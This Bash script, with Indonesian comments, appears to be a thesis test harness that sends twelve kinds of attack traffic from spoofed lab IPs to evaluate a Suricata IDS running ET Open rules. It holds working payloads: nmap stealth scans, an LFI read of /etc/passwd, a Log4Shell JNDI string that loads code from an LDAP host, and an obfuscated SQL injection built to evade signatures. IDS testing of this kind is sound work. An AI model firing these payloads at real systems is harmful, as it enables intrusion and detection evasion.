#!/bin/bash
# ==============================================================================
# SuricataEVE - Automated Attack Script (Proven ET-Open Rules)
# ==============================================================================

TARGET="${TARGET:-192.168.216.128}"
IFACE="${IFACE:-eth0}"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Tolong jalankan script ini sebagai root (sudo ./atk.sh)${NC}"
  exit 1
fi

header() {
    echo -e "\n${BLUE}${BOLD}================================================================${NC}"
    echo -e "${CYAN}${BOLD} $1 ${NC}"
    echo -e "${BLUE}${BOLD}================================================================${NC}\n"
}

info() {
    echo -e "${YELLOW}[*]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

atk() {
    echo -e "${RED}[!]${NC} $1"
}

setup_all_ips() {
    info "Menyiapkan 12 IP Bayangan di antarmuka ${IFACE} (101..112)..."
    for i in {101..112}; do
        ip addr add 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "Semua IP Bayangan siap digunakan!"
}

cleanup_all_ips() {
    info "Menghapus semua IP Bayangan dari antarmuka ${IFACE}..."
    for i in {101..112}; do
        ip addr del 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "Pembersihan selesai."
}

# ------------------------------------------------------------------------------
# 10 SERANGAN PASTI TERBLOKIR (TRUE POSITIVE: .101 s/d .110)
# Semua rule ini terbukti 100% memicu signature bawaan ET Open Rules
# ------------------------------------------------------------------------------

do_1_portscan() {
    header "1. Port Scan (Nmap Aggressive) -> IP: .101"
    atk "Mendeteksi port terbuka dan versi service (Nmap)..."
    nmap -S 192.168.216.101 -e ${IFACE} -sV -sC -A -T4 -p 1-1000 ${TARGET} -Pn >/dev/null 2>&1
    success "Selesai. IP 192.168.216.101 TERBLOKIR!"
}

do_2_synscan() {
    header "2. SYN Stealth Scan (Nmap) -> IP: .102"
    atk "Scanning TCP SYN secara diam-diam..."
    nmap -S 192.168.216.102 -e ${IFACE} -sS -O --osscan-guess -T4 ${TARGET} -Pn >/dev/null 2>&1
    success "Selesai. IP 192.168.216.102 TERBLOKIR!"
}

do_3_finscan() {
    header "3. FIN Scan (Nmap) -> IP: .103"
    atk "Mengirim paket TCP FIN..."
    nmap -S 192.168.216.103 -e ${IFACE} -sF -T4 -p 80,8080,22 ${TARGET} -Pn >/dev/null 2>&1
    success "Selesai. IP 192.168.216.103 TERBLOKIR!"
}

do_4_xmasscan() {
    header "4. XMAS Scan (Nmap) -> IP: .104"
    atk "Mengirim paket TCP XMAS (FIN, PSH, URG)..."
    nmap -S 192.168.216.104 -e ${IFACE} -sX -T4 -p 80,8080,22 ${TARGET} -Pn >/dev/null 2>&1
    success "Selesai. IP 192.168.216.104 TERBLOKIR!"
}

do_5_lfi() {
    header "5. Local File Inclusion (/etc/passwd) -> IP: .105"
    atk "Membaca file sistem /etc/passwd (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.105 \
            "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.105 TERBLOKIR!"
}

do_6_morfeus() {
    header "6. Morfeus Web Scanner (muieblackcat) -> IP: .106"
    atk "Memalsukan scanner Morfeus lawas (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.106 \
            "http://${TARGET}/muieblackcat"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.106 TERBLOKIR!"
}

do_7_phpeasteregg() {
    header "7. PHP Easter Egg Info Disclosure -> IP: .107"
    atk "Mengakses halaman rahasia PHP Easter Egg (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.107 \
            "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.107 TERBLOKIR!"
}

do_8_gobuster() {
    header "8. Web Directory Scanner (Gobuster) -> IP: .108"
    atk "Memalsukan User-Agent scanner Gobuster (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.108 \
            -H "User-Agent: gobuster/3.1.0" \
            "http://${TARGET}/admin/"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.108 TERBLOKIR!"
}

do_9_log4shell() {
    header "9. Log4Shell CVE-2021-44228 -> IP: .109"
    atk "Eksploitasi Java Log4j via JNDI injection (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.109 \
            -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' \
            "http://${TARGET}/"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.109 TERBLOKIR!"
}

do_10_httptrace() {
    header "10. HTTP TRACE Method (XST) -> IP: .110"
    atk "Mengirim method HTTP TRACE terlarang (3x request)..."
    for i in {1..3}; do
        curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.110 \
            -X TRACE "http://${TARGET}/"
        sleep 0.1
    done
    success "Selesai (3x). IP 192.168.216.110 TERBLOKIR!"
}

# ------------------------------------------------------------------------------
# 2 SKENARIO REALISTIS (JANGAN SAMPAI TERBLOKIR: .111 dan .112)
# ------------------------------------------------------------------------------

do_11_bypass_obfuscation() {
    header "11. [FALSE NEGATIVE] SQLi Obfuscation (Lolos Signature) -> IP: .111"
    info "Mengirim payload terselubung yang tidak ada di signature ET Open..."
    # Menggunakan comment obfuscation yang lolos dari signature
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.111 \
        "http://${TARGET}/vulnerabilities/sqli/?id=1%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2Cuser%28%29&Submit=Submit"
    success "Terkirim. IP 192.168.216.111 TIDAK TERBLOKIR (False Negative / Serangan Lolos)!"
}

do_12_normal_user() {
    header "12. [NORMAL TRAFFIC] Akses Pengguna Sah -> IP: .112"
    info "Mengirim traffic pengguna biasa (hanya request halaman web normal)..."
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/"
    curl -s -o /dev/null --connect-timeout 2 --interface 192.168.216.112 "http://${TARGET}/login.php"
    success "Terkirim. IP 192.168.216.112 TIDAK TERBLOKIR (Normal / Bukan Penyerang)!"
}

do_all() {
    setup_all_ips
    header "🚀 MEMULAI PENGUJIAN LENGKAP UNTUK EVALUASI SKRIPSI"
    
    # 10 Serangan yang Pasti Terblokir
    do_1_portscan
    do_2_synscan
    do_3_finscan
    do_4_xmasscan
    do_5_lfi
    do_6_morfeus
    do_7_phpeasteregg
    do_8_gobuster
    do_9_log4shell
    do_10_httptrace

    # 2 Skenario Normal / Lolos (JANGAN KEBLOKIR)
    do_11_bypass_obfuscation
    do_12_normal_user

    header "PENGUJIAN SELESAI!"
    echo -e "${GREEN}Status Hasil Evaluasi:${NC}"
    echo -e " • IP .101 s/d .110 : ${GREEN}10 Serangan Pasti Terblokir (True Positive)${NC}"
    echo -e " • IP .111         : ${YELLOW}Lolos dari Signature (False Negative)${NC}"
    echo -e " • IP .112         : ${CYAN}Traffic Pengguna Normal (Aman / Tidak Diblokir)${NC}"
    echo -e "\n${YELLOW}Langkah Berikutnya:${NC}"
    echo -e "1. Di Server: jalankan ${CYAN}python3 report.py${NC}"
    echo -e "2. Buka Web : ${CYAN}http://${TARGET}:8080/static/report_summary.html${NC}\n"
}

setup_all_ips

while true; do
    echo -e "\n${BLUE}${BOLD}=== SURICATA AUTOMATED ATTACK & EVALUATION SUITE ===${NC}"
    echo -e "Target Server: ${BOLD}http://${TARGET}${NC}\n"
    
    echo -e "  ${GREEN}[10 SERANGAN ET-OPEN PROVEN - PASTI TERBLOKIR]${NC}"
    echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan Aggressive       (IP: .101)"
    echo -e "  ${BOLD} 2${NC}) 👻 SYN Stealth Scan          (IP: .102)"
    echo -e "  ${BOLD} 3${NC}) 🏁 FIN Scan                  (IP: .103)"
    echo -e "  ${BOLD} 4${NC}) 🎄 XMAS Scan                 (IP: .104)"
    echo -e "  ${BOLD} 5${NC}) 📂 LFI /etc/passwd           (IP: .105)"
    echo -e "  ${BOLD} 6${NC}) 🐈 Morfeus Scanner           (IP: .106)"
    echo -e "  ${BOLD} 7${NC}) 🥚 PHP Easter Egg            (IP: .107)"
    echo -e "  ${BOLD} 8${NC}) 🕷️  Gobuster Scanner          (IP: .108)"
    echo -e "  ${BOLD} 9${NC}) 🐚 Log4Shell JNDI Injection  (IP: .109)"
    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE Method         (IP: .110)"
    echo ""
    echo -e "  ${YELLOW}[SKENARIO REALISTIS SKRIPSI - TIDAK TERBLOKIR]${NC}"
    echo -e "  ${BOLD}11${NC}) 🥷 SQLi Obfuscation (Lolos / False Negative) (IP: .111)"
    echo -e "  ${BOLD}12${NC}) 🌐 Traffic Normal (Pengguna Sah)            (IP: .112)"
    echo ""
    echo -e "  ${CYAN}[EKSEKUSI & UTILITAS]${NC}"
    echo -e "  ${BOLD} A${NC}) 🚀 JALANKAN SEMUA SEKALIGUS (Rekomendasi untuk Skripsi)"
    echo -e "  ${BOLD} C${NC}) 🧹 Bersihkan IP Bayangan (${IFACE})"
    echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
    echo ""
    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih menu [0-12 / A / C]: " CHOICE

    case $CHOICE in
         1) do_1_portscan ;;
         2) do_2_synscan ;;
         3) do_3_finscan ;;
         4) do_4_xmasscan ;;
         5) do_5_lfi ;;
         6) do_6_morfeus ;;
         7) do_7_phpeasteregg ;;
         8) do_8_gobuster ;;
         9) do_9_log4shell ;;
        10) do_10_httptrace ;;
        11) do_11_bypass_obfuscation ;;
        12) do_12_normal_user ;;
        [Aa]) do_all ;;
        [Cc]) cleanup_all_ips ;;
         0) cleanup_all_ips; echo "Keluar."; exit 0 ;;
         *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
    esac
done
